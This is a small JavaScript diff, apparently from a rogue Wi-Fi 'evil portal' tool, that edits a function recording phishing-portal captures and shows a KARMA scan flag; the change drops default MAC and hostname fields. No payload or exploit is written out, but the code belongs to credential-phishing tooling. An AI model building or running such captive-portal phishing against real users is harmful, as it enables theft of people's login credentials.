@@ -416,7 +416,7 @@ function finishKarmaScan() {
   evilportal.karmaScanning = false;
 }
 function addPortalCapture(capture) {
-  const cap = { mac: '', hostname: '', url: '/login', ts: nowEpoch(), ...capture,
+  const cap = { url: '/login', ts: nowEpoch(), ...capture,
     verification: evilportal.settings.verify && evilportal.mode === 1 ? 'queued' : 'off' };
   evilportal.captures.push(cap);
   evilportal.attempts++;
